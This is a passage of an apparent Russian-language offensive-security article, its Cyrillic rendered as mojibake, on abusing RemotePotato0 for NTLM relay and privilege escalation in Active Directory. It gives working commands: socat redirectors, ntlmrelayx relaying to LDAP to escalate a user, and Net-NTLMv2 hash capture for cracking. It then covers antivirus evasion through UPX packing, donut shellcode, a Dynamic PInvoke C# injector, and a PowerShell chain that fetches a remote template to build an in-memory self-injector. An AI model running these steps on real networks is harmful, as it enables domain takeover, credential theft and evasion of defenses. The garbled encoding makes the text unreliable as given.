2. –ù–∞ —Å–≤–æ–µ–º —Å–µ—Ä–≤–µ—Ä–µ –∞—Ç–∞–∫—É—é—â–∏–π –∑–µ—Ä–∫–∞–ª–∏—Ç —Ç—Ä–∞—Ñ–ª–æ, –ø—Ä–∏—à–µ–¥—à–µ–µ –Ω–∞ 135/TCP –ø–æ—Ä—Ç, –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ –∞—Ç–∞–∫—É–µ–º—É—é –º–∞—à–∏–Ω—É –≤ –ø–æ—Ä—Ç, –≥–¥–µ —É–∂–µ –ø–æ–¥–Ω—è—Ç —Ñ–µ–π–∫–æ–≤—ã–π OXID-—Ä–µ–∑–æ–ª–≤–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–¥–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—É DCOM –Ω—É–∂–Ω—ã–π RPC-–±–∏–Ω–¥–∏–Ω–≥.
3. –ß–∞—Å—Ç–∏—á–Ω–æ –ø–æ–≤—Ç–æ—Ä—è–µ—Ç—Å—è —à–∞–≥ 4 –∏–∑ –æ–ø–∏—Å–∞–Ω–∏—è —Ä–∞–±–æ—Ç—ã RoguePotato: –≤—ã–∑–æ–≤ `IRemUnknown2::RemRelease` –≤ –æ—Ç–Ω–æ—à–µ–Ω–∏–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ RPC-—Å–µ—Ä–≤–µ—Ä–∞, –∏–Ω–∫–∞–ø—Å—É–ª—è—Ü–∏—è RPC-–∑–∞–ø—Ä–æ—Å–∞ —Å NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π –≤ HTTP –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –µ–≥–æ –Ω–∞ –Ω–∞—à HTTP-—Å–µ—Ä–≤–µ—Ä. –ü–æ—Å–ª–µ–¥–Ω–∏–π —É–∂–µ –ø–æ–¥–Ω—è—Ç –Ω–∞ –º–∞—à–∏–Ω–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ –≤ –≤–∏–¥–µ –∏–Ω—Å—Ç–∞–Ω—Å–∞ [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).
4. –ü—Ä–æ–≤–µ–¥–µ–Ω–∏–µ –∫—Ä–æ—Å—Å-–ø—Ä–æ—Ç–æ–∫–æ–ª—å–Ω–æ–π –∞—Ç–∞–∫–∏ NTLM Relay –Ω–∞ –Ω–µ–∑–∞—â–∏—â–µ–Ω–Ω—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç —Å –¥–æ–º–µ–Ω–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –∞—Ç–∞–∫—É—é—â–∏–π –º–æ–∂–µ—Ç –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–≥–æ –µ–º—É –¥–æ–º–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–æ–º–µ–Ω–Ω—ã–µ –≥—Ä—É–ø–ø—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ–µ –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ä–µ—Å—É—Ä—Å–æ–≤ [RBCD Abuse](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) –¥–ª—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –¥–æ–º–µ–Ω–Ω—ã—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª—é–±–æ–π –¥—Ä—É–≥–æ–π –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ ntlmrelayx.py.

[![–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RemotePotato0 (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì www.sentinelone.com)](/assets/images/remote-potato-0/remotepotato0-scheme.png)](/assets/images/remote-potato-0/remotepotato0-scheme.png)
{:.center-image}

–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RemotePotato0 (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì www.sentinelone.com)
{:.quote}

–ü–µ—Ä–µ–π–¥–µ–º –∫ –ø—Ä–∞–∫—Ç–∏–∫–µ.

## –°—Ñ–µ—Ä–∏—á–µ—Å–∫–∏–µ –ø—Ä–∏–º–µ—Ä—ã –≤ –≤–∞–∫—É—É–º–µ

–ü—Ä–µ–∂–¥–µ —á–µ–º –≥–æ–≤–æ—Ä–∏—Ç—å –æ–± —É–∫–ª–æ–Ω–µ–Ω–∏–∏ –æ—Ç AV –∏ –¥—Ä—É–≥–∏—Ö ¬´—É–ª—É—á—à–∞–ª–∫–∞—Ö¬ª, –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ –∞—Ç–∞–∫—É –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤–∞—Ö –∑–∞—â–∏—Ç—ã, —á—Ç–æ–±—ã –ø–æ–Ω–∏–º–∞—Ç—å, –∫–∞–∫–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –Ω–∞–º –æ–∂–∏–¥–∞—Ç—å.

–Ø –∑–∞–≥—Ä—É–∂—É —Å–≤–µ–∂–∏–π —Ä–µ–ª–∏–∑ [RemotePotato0](https://github.com/antonioCoco/RemotePotato0) –∏ —Ä–∞—Å–ø–∞–∫—É—é –µ–≥–æ –ø—Ä—è–º–æ –Ω–∞ —Ü–µ–ª–µ–≤–æ–º —Å–µ—Ä–≤–µ—Ä–µ.

```
PS > curl https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip -o RemotePotato0.zip
PS > Expand-Archive .\RemotePotato0.zip -DestinationPath .
PS > ls .\RemotePotato0*
PS > .\RemotePotato0.exe
```

[![–ó–∞–≥—Ä—É–∑–∫–∞ –∏ —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∞ RemotePotato0](/assets/images/remote-potato-0/remotepotato0-help.png)](/assets/images/remote-potato-0/remotepotato0-help.png)
{:.center-image}

–ó–∞–≥—Ä—É–∑–∫–∞ –∏ —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∞ RemotePotato0
{:.quote}

–ö–∞–∫ –º–æ–∂–Ω–æ –≤–∏–¥–µ—Ç—å –∏–∑ help-–∞, –≤ –Ω–∞—à–µ–º —Ä–∞—Å–ø–æ—Ä—è–∂–µ–Ω–∏–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–µ–∂–∏–º–æ–≤ –∞—Ç–∞–∫–∏: –º–æ–∂–Ω–æ –ª–∏–±–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –Ω–∞ relay-—Å–µ—Ä–≤–µ—Ä –¥–ª—è –µ–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –Ω–∞ –¥—Ä—É–≥–æ–π —ç–Ω–¥–ø–æ–∏–Ω—Ç (—Ä–µ–∂–∏–º 0, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é), –ª–∏–±–æ –ø–æ–ª—É—á–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ —Ö–µ—à–∞ Net-NTLMv2 –¥–ª—è –µ–≥–æ –æ—Ñ–ª–∞–π–Ω-–ø–µ—Ä–µ–±–æ—Ä–∞ (—Ä–µ–∂–∏–º 2). –†–µ–∂–∏–º—ã 1 –∏ 3 –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω—ã –¥–ª—è —Ç—Ä–∏–≥–≥–µ—Ä–∞ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤—Ä—É—á–Ω—É—é, –±–µ–∑ ¬´–∫–∞—Ä—Ç–æ—à–∫–∏¬ª, –ø–æ—ç—Ç–æ–º—É –Ω–∞–º —ç—Ç–æ –Ω–µ –æ—á–µ–Ω—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ.

–î–ª—è —Ä–∞–∑–º–∏–Ω–∫–∏ —Å–ø–µ—Ä–≤–∞ –ø–æ–ø—Ä–æ–±—É–µ–º —Ä–µ–∂–∏–º 2:

* `-m` ‚Äì —Ä–µ–∂–∏–º –∞—Ç–∞–∫–∏,
* `-x` ‚Äì IP-–∞–¥—Ä–µ—Å TCP-—Ä–µ–¥–∏—Ä–µ–∫—Ç–æ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–∑–µ—Ä–∫–∞–ª–∏—Ç OXID-—Ä–µ–∑–æ–ª–≤ –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ –º–∞—à–∏–Ω—É-–∂–µ—Ä—Ç–≤—É –Ω–∞ –ø–æ—Ä—Ç, —É–∫–∞–∑–∞–Ω–Ω—ã–π –≤ –æ–ø—Ü–∏–∏ `-p` (–µ—Å–ª–∏ –±—ã —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª Windows Server 2012, –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –æ–±–æ–π—Ç–∏—Å—å –±–µ–∑ —ç—Ç–æ–π –æ–ø—Ü–∏–∏, —Ç. –∫. –Ω–∞ –Ω–µ–º –Ω–µ—Ç —Ñ–∏–∫—Å–æ–≤ –ø–æ –∑–∞–ø—Ä–µ—Ç—É —Ä–µ–∑–æ–ª–≤–∞ OXID-–∑–∞–ø—Ä–æ—Å–æ–≤ —á–µ—Ä–µ–∑ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø–æ—Ä—Ç—ã),
* `-p` ‚Äì –ø–æ—Ä—Ç —Ñ–µ–π–∫–æ–≤–æ–≥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ OXID-—Ä–µ–∑–æ–ª–≤–µ—Ä–∞, –∫—É–¥–∞ –±—É–¥–µ—Ç –æ—Ç–∑–µ—Ä–∫–∞–ª–µ–Ω OXID-–∑–∞–ø—Ä–æ—Å –º–∞—à–∏–Ω–æ–π –∞—Ç–∞–∫—É—é—â–µ–≥–æ,
* `-s` ‚Äì –Ω–æ–º–µ—Ä —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ –º—ã —Ö–æ—Ç–∏–º –æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–∏—Ç—å.

```
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<VICTIM_IP>:9998
PS > .\RemotePotato0.exe -m 2 -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>
```

[![–ó–∞–ø—É—Å–∫ RemotePotato0 –≤ —Ä–µ–∂–∏–º–µ —Å–±–æ—Ä–∞ —Ö–µ—à–µ–π](/assets/images/remote-potato-0/remotepotato0-hashes.png)](/assets/images/remote-potato-0/remotepotato0-hashes.png)
{:.center-image}

–ó–∞–ø—É—Å–∫ RemotePotato0 –≤ —Ä–µ–∂–∏–º–µ —Å–±–æ—Ä–∞ —Ö–µ—à–µ–π
{:.quote}

–ö–∞–∫ –≤–∏–¥–∏–º, –º—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–∏–ª–∏ –∑–Ω–∞—á–µ–Ω–∏–µ —Ö–µ—à–∞ Net-NTLMv2, –∫–æ—Ç–æ—Ä—ã–π —Ç–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ —Å–ø–æ–∫–æ–π–Ω–æ –±—Ä—É—Ç–∏—Ç—å –≤ –æ—Ñ–ª–∞–π–Ω–µ (—Ä–µ–∂–∏–º `5600` hashcat —Ç–µ–±–µ –≤ –ø–æ–º–æ—â—å). –≠—Ç–æ –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–∞—è –∑–∞–º–µ–Ω–∞ –∞—Ç–∞–∫–∏ [Internal Monologue](https://github.com/eladshamir/Internal-Monologue), –Ω–µ —Ç—Ä–µ–±—É—é—â–∞—è –∫ —Ç–æ–º—É –∂–µ –ø—Ä–∞–≤ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

–¢–µ–ø–µ—Ä—å –ø–µ—Ä–µ–π–¥–µ–º –∫ —Ä–µ–ª–µ—é –Ω–∞ LDAP. –û–ø—Ü–∏–∏ —Ç–µ –∂–µ —Å–∞–º—ã–µ, —Ç–æ–ª—å–∫–æ –¥–æ–±–∞–≤–∏–º —Ñ–ª–∞–≥ `-r`, –∑–∞–¥–∞—é—â–∏–π IP-–∞–¥—Ä–µ—Å HTTP-—Å–µ—Ä–≤–µ—Ä–∞ –∞—Ç–∞–∫—É—é—â–µ–≥–æ, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–æ–≤–µ–¥–µ—Ç NTLM Relay.

```
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<VICTIM_IP>:9998
~$ sudo ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server --no-wcf-server --no-raw-server --escalate-user <PWNED_USER>
PS > .\RemotePotato0.exe -m 0 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>
```

[![–ó–∞–ø—É—Å–∫ RemotePotato0 –≤ —Ä–µ–∂–∏–º–µ —Ä–µ–ª–µ—è](/assets/images/remote-potato-0/remotepotato0-relay.png)](/assets/images/remote-potato-0/remotepotato0-relay.png)
{:.center-image}

–ó–∞–ø—É—Å–∫ RemotePotato0 –≤ —Ä–µ–∂–∏–º–µ —Ä–µ–ª–µ—è
{:.quote}

–í–∂—É—Ö, –∏ –æ–¥–Ω–æ–π –∫–æ–º–∞–Ω–¥–æ–π –º—ã —ç–Ω—Ç–´—Ä–ø—Ä–∞–π–∑ –æ–¥–º–µ–Ω—ã.

# –ë–æ–µ–≤–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞

–≠—Ç–æ –≤—Å–µ, –∫–æ–Ω–µ—á–Ω–æ, –∑–¥–æ—Ä–æ–≤–æ, –Ω–æ —Å–æ–≤—Å–µ–º –Ω–µ –∂–∏–∑–Ω–µ–Ω–Ω–æ.

–£—Å–ª–æ–∂–Ω–∏–º –∑–∞–¥–∞—á—É: –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Å—Ç–∏ —Ç—É –∂–µ –∞—Ç–∞–∫—É –ø—Ä–∏ –∞–∫—Ç–∏–≤–Ω–æ–º –¥–µ—Ñ–µ–Ω–¥–µ—Ä–µ –∏ –Ω–µ –æ–±–ª–∞–¥–∞—è –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–æ–π –º–∞—à–∏–Ω–æ–π –Ω–∞ Linux, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–π –ø–æ–¥–Ω–∏–º–∞–µ—Ç—Å—è TCP-—Ä–µ–¥–∏—Ä–µ–∫—Ç–æ—Ä (–¥–æ–ø—É—Å—Ç–∏–º, –º—ã –ø—Ä–æ–ª–æ–º–∏–ª–∏ –≤–Ω–µ—à–Ω–∏–π –ø–µ—Ä–∏–º–µ—Ç—Ä –∏ –æ–∫–∞–∑–∞–ª–∏—Å—å –≤–Ω—É—Ç—Ä–∏ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Å —Å–µ—Å—Å–∏–µ–π Cobalt Strike).

## –£–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç AV

–°—É–¥—è –ø–æ –º–æ–µ–º—É –æ–ø—ã—Ç—É, –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –∞–≤–µ—Ä–æ–≤ –¥–µ—Ç–µ–∫—Ç—è—Ç RemotePotato0.exe, –æ—Å–Ω–æ–≤—ã–≤–∞—è—Å—å –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –Ω–∞ —Å–∏–≥–Ω–∞—Ç—É—Ä–Ω–æ–º –∞–Ω–∞–ª–∏–∑–µ:

```
rule SentinelOne_RemotePotato0_privesc {
    meta:
        author = "SentinelOne"
        description = "Detects RemotePotato0 binary"
        reference = "https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop"
        
    strings:
        $import1 = "CoGetInstanceFromIStorage"
        $istorage_clsid = "{00000306-0000-0000-c000-000000000046}" nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase wide ascii
        $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase wide ascii
        
    condition:       
        (uint16(0) == 0x5A4D) and $import1 and $istorage_clsid and $meow_header and 1 of ($clsid*)
}
```

–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–æ–∑–º–æ–∂–Ω—ã—Ö —Ä–µ—à–µ–Ω–∏–π —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã:

1. –£–ø–∞–∫–æ–≤–∞—Ç—å RemotePotato0.exe —Å –ø–æ–º–æ—â—å—é –∫–∞–∫–æ–≥–æ-–Ω–∏–±—É–¥—å –∞—Ä—Ö–∏–≤–∞—Ç–æ—Ä–∞/—ç–Ω–∫–æ–¥–µ—Ä–∞/—à–∏—Ñ—Ä–∞—Ç–æ—Ä–∞.
2. –í—ã–¥–µ—Ä–Ω—É—Ç—å —à–µ–ª–ª–∫–æ–¥ –∏–∑ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ –≤–Ω–µ–¥—Ä–∏—Ç—å –µ–≥–æ –≤ –ø—Ä–æ—Ü–µ—Å—Å –∏–∑ –ø–∞–º—è—Ç–∏.

–ù–∞ —Å–∞–º–æ–º –¥–µ–ª–µ, –≤—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–± ‚Äì —ç—Ç–æ overkill, –ø–æ—Ç–æ–º—É —á—Ç–æ –ø—Ä–æ—Ç–∏–≤ Windows Defender —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–∂–µ [—É–ø–∞–∫–æ–≤–∫–∞ UPX-–æ–º](https://xakep.ru/2021/06/03/elf-upx-unpack/).

[![Defender Advanced (–∞–≥–∞ –¥–∞) Evasion UPX-—É–ø–∞–∫–æ–≤–∫–æ–π](/assets/images/remote-potato-0/remotepotato0-upx.png)](/assets/images/remote-potato-0/remotepotato0-upx.png)
{:.center-image}

Defender Advanced (–∞–≥–∞ –¥–∞) Evasion UPX-—É–ø–∞–∫–æ–≤–∫–æ–π
{:.quote}

–ù–æ –º—ã –º–æ–∂–µ–º –ª—É—á—à–µ: –≤—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–± –Ω–µ –ø–æ—Ç—Ä–µ–±—É–µ—Ç –¥–∞–∂–µ –∑–∞–≥—Ä—É–∑–∫–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ —ç–∫—Å–ø–ª–æ–∏—Ç–∞ –Ω–∞ –¥–∏—Å–∫, –ø–æ—ç—Ç–æ–º—É —Ä–µ–∞–ª–∏–∑—É–µ–º —ç—Ç–æ.

–í –æ–¥–Ω–æ–π –∏–∑ –ø—Ä–æ—à–ª—ã—Ö —Å—Ç–∞—Ç–µ–π –º—ã –≥–æ–≤–æ—Ä–∏–ª–∏ –æ –±–µ—Å—à—É–º–Ω–æ–º –≤–Ω–µ–¥—Ä–µ–Ω–∏–∏ —à–µ–ª–ª–∫–æ–¥–∞ –≤ –ø–∞–º—è—Ç—å —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ —Å –ø–æ–º–æ—â—å—é –º–µ—Ö–∞–Ω–∏–∑–º–∞ [D/Invoke](https://thewover.github.io/Dynamic-Invoke/): https://xakep.ru/2022/03/31/keethief/

–ü–æ–º–∏–º–æ D/Invoke —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –µ—â–µ –æ–¥–∏–Ω –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π —Å–ø–æ—Å–æ–± –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –≤—ã–∑–æ–≤–æ–≤ Win32 API –ø—Ä–∏ —Ç—Ä–µ–π–¥–∫—Ä–∞—Ñ—Ç–µ –Ω–∞ C#. –û–Ω –æ—Å–≤–µ—â–µ–Ω –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ ‚Äì [Unmanaged Code Execution with .NET Dynamic PInvoke](https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/).

–°—É—Ç—å –ø—Ä–æ—Å—Ç–∞: –≤ C# —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º [System.Reflection.Emit](https://docs.microsoft.com/ru-ru/dotnet/api/system.reflection.emit?view=net-6.0), –ø–æ–∑–≤–æ–ª—è—é—â–∏–π ¬´–Ω–∞ –ª–µ—Ç—É¬ª —Å–æ–∑–¥–∞–≤–∞—Ç—å —Å–±–æ—Ä–∫–∏ .NET –∏ –∏—Å–ø–æ–ª–Ω—è—Ç—å –∏—Ö —Å –ø–æ–º–æ—â—å—é –º–µ—Ö–∞–Ω–∏–∑–º–∞ `Reflection.Assembly` –∏–∑ –ø–∞–º—è—Ç–∏ –ø—Ä—è–º–æ –≤ —Ä–∞–Ω—Ç–∞–π–º–µ. –ò—Å–ø–æ–ª—å–∑—É—è —ç—Ç–æ—Ç –º–µ—Ö–∞–Ω–∏–∑–º, –º—ã –º–æ–∂–µ–º —Ç–∞–∫ –∂–µ ¬´–Ω–∞ –ª–µ—Ç—É¬ª —Å—Ç—Ä–æ–∏—Ç—å –æ–±–µ—Ä—Ç–∫–∏ –¥–ª—è –≤—ã–∑–æ–≤–æ–≤ Win32 API, –Ω–µ –ø—Ä–∏–±–µ–≥–∞—è –∫ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–º –¥–µ–∫–ª–∞—Ä–∞—Ü–∏—è–º [P/Invoke](http://www.pinvoke.net/).

–ü—Ä–∏–º–µ—Ä –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ **CreateThread**, –¥–µ—Ä–≥–∞—é—â–µ–π –æ–¥–Ω–æ–∏–º–µ–Ω–Ω—É—é —Ä—É—á–∫—É API –∏–∑ `kernel32.dll`:

```csharp
class DPInvoke
{
    static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
    {
        AssemblyName assemblyName = new AssemblyName("Temp01");
        AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

        MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();

        MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
        object result = dynamicMethod.Invoke(null, parameters);

        return result;
    }

    public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
    {
        Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "CreateThread", parameters, parameterTypes);
        return result;
    }
}
```

–ù–∞ –æ—Å–Ω–æ–≤–µ –ø—Ä–∏–º–µ—Ä–æ–≤ –∏–∑ —Å—Ç–∞—Ç—å–∏ –≤—ã—à–µ —è –Ω–∞–ø–∏–ª–∏–ª [—à–∞–±–ª–æ–Ω](https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37) –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ —Å–æ–∑–¥–∞–Ω–∏—è self-–∏–Ω–∂–µ–∫—Ç–æ—Ä–æ–≤. –®–µ–ª–ª–∫–æ–¥—ã –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è –∏–∑ PE-—Ñ–∞–π–ª–æ–≤ —Å –ø–æ–º–æ—â—å—é [—ç—Ç–æ–≥–æ —Ñ–æ—Ä–∫–∞](https://github.com/S4ntiagoP/donut/tree/syscalls) –ø—Ä–æ–µ–∫—Ç–∞ donut.

–î–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ .NET –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –º–∞—à–∏–Ω–∞ —Å Visual Studio.

```
~$ wget -q https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip
~$ unzip RemotePotato0.zip
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 2 -x <ATTACKER_IP> -p 9998 -s <SESSION_ID>' -o RemotePotato0.bin
PS > $binaryName = "RemotePotato0"
PS > $bytes = [System.IO.File]::ReadAllBytes("$(pwd)\${binaryName}.bin")
PS > [System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
PS > $dStream = New-Object System.IO.Compression.DeflateStream($outStream, [System.IO.Compression.CompressionLevel]::Optimal)
PS > $dStream.Write($bytes, 0, $bytes.Length)
PS > $dStream.Dispose()
PS > $outBytes = $outStream.ToArray()
PS > $outStream.Dispose()
PS > $b64Compressed = [System.Convert]::ToBase64String($outBytes)
PS > $template = (New-Object Net.WebClient).DownloadString("https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37/raw/881ec72c7c310bc07af017656a47d0c659fab4f6/template.cs") -creplace 'DONUT', $b64Compressed
PS > $template -creplace 'NAMESPACE', "${binaryName}Inject" > ${binaryName}Inject.cs
PS > csc /t:exe /platform:x64 /out:${binaryName}Inject.exe ${binaryName}Inject.cs
PS > rm ${binaryName}Inject.cs
```

[![–ö–æ–º–ø–∏–ª—è—Ü–∏—è self-–∏–Ω–∂–µ–∫—Ç–æ—Ä–∞](/assets/images/remote-potato-0/remotepotato0-compile-injector.png)](/assets/images/remote-potato-0/remotepotato0-compile-injector.png)
{:.center-image}

–ö–æ–º–ø–∏–ª—è—Ü–∏—è self-–∏–Ω–∂–µ–∫—Ç–æ—Ä–∞
{:.quote}

–ü—Ä–æ—Ç–µ—Å—Ç–∏–º –µ–≥–æ –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ä–∞–∑–¥–µ–ª–µ, –∫–æ–≥–¥–∞ —Ä–µ—à–∏–º –ø—Ä–æ–±–ª–µ–º—É —Å TCP-—Ä–µ–¥–∏—Ä–µ–∫—Ç–æ—Ä–æ–º.

## ngrok + socat = üíï

–î–æ–ø—É—Å—Ç–∏–º, –º—ã –ø–æ–ª—É—á–∏–ª–∏ ¬´–º–∞—è—á–æ–∫¬ª CS –Ω–∞ —É—è–∑–≤–∏–º–æ–º –¥–ª—è –∞—Ç–∞–∫–∏ —Å–µ—Ä–≤–µ—Ä–µ, –Ω–æ —É –Ω–∞—Å –Ω–µ—Ç –¥—Ä—É–≥–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞ –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Å–µ—Ç–∏ –∂–µ—Ä—Ç–≤—ã, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ –∫–∞–∫ –∑–µ—Ä–∫–∞–ª–æ –¥–ª—è OXID-–∑–∞–ø—Ä–æ—Å–æ–≤.

